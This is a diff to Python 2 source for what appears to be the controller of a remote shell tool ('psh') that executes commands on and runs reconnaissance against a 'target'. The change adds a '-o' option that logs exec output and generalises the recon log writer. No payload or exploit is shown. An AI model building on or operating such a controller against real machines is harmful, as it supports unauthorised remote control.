@@ -51,8 +51,14 @@ def ctrl_shell_server(s, PORT):
                     print '  {}'.format(cmd)
             # exec
             elif inp.split()[0] == cmds[2]:
-                if re.search('^exec ("[^"]+"\ )+$', inp + ' '):
-                    print ctrl_shell_exchange(conn, inp)
+                inp += ' '  # for regex
+                if re.search('^exec ((("[^"]+")|(-o))\ )+$', inp):
+                    # remove -o's, trailing space
+                    tmp = inp.replace('-o ', '')[:-1]
+                    response = ctrl_shell_exchange(conn, tmp)
+                    print response
+                    if '-o' in inp.split():
+                        ctrl_shell_write(response, inp.split()[0], OUT)
                 else:
                     print 'Execute commands on target.'
                     print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
@@ -62,8 +68,8 @@ def ctrl_shell_server(s, PORT):
                 if re.search('^recon( -o)?$', inp):
                     response = ctrl_shell_exchange(conn, inp.split()[0])
                     print response
-                    if '-o' in inp:
-                        ctrl_shell_recon_write(response, OUT)
+                    if '-o' in inp.split():
+                        ctrl_shell_write(response, inp.split()[0], OUT)
                 else:
                     print 'Basic reconaissance of target.'
                     print 'usage: recon [-h] [-o]'
@@ -97,17 +103,18 @@ def ctrl_shell_exchange(conn, inp):
     return sockrecv(conn)
 
 
-def ctrl_shell_recon_write(response, out_dir):
+def ctrl_shell_write(response, prefix, out_dir):
     ts = datetime.now().strftime('%Y%m%d%S%f')
     out_ts_dir = '{}/{}'.format(out_dir, ts[:-8])
-    outfile = '{}/recon-{}.txt'.format(out_ts_dir, ts)
+    outfile = '{}/{}-{}.txt'.format(out_ts_dir, prefix, ts)
+    response = '{}\n\n{}'.format(datetime.now(), response)
     if not os.path.isdir(out_dir):
         os.mkdir(out_dir)
     if not os.path.isdir(out_ts_dir):
         os.mkdir(out_ts_dir)
     with open(outfile, 'w') as f:
         f.write(response)
-        print 'psh : Recon log written to {}'.format(outfile)
+        print 'psh : {} log written to {}'.format(prefix, outfile)
 
 
 def ctrl_shell_shell(s, prompt):
